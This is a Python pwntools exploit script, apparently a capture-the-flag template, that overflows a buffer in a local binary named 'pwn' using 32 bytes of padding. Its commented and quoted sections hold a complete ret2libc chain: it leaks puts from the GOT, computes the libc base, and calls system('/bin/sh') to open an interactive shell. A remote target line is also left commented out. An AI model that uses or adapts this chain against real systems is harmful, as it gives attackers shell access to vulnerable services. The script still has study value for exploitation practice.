#!/usr/bin/python3
from pwn import *
from pprint import pprint

context.arch = 'amd64'

offset = 32


elf = ELF("./pwn")
p = elf.process()
#p = remote("192.168.125.11",51337)

# rop = ROP(elf)
# rop.call(elf.symbols["puts"], [elf.got['puts']])
# rop.call(elf.symbols["main"])

print(p.recvuntil("\n"))

payload = [
	b"A"*offset,
	# rop.chain()
	b"BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB"
]

payload = b"".join(payload)
p.sendline(payload)
print(p.recv())

'''
puts = u64(p.recvuntil("\n").rstrip().ljust(8, b"\x00"))
print(puts)
log.info(f"puts found at {hex(puts)}")

libc = ELF("libc6_2.27-3ubuntu1.4_amd64.so")
libc.address = puts - libc.symbols["puts"]
log.info(f"libc base address determined at {hex(libc.address)}")


rop = ROP(libc)

rop.call("puts", [next(libc.search(b"/bin/sh\x00"))])
rop.call("system", [next(libc.search(b"/bin/sh\x00"))])
rop.call("exit")

payload = [
	b"A"*offset,
	rop.chain()
]

payload = b"".join(payload)
p.sendline(payload)


p.interactive()
'''
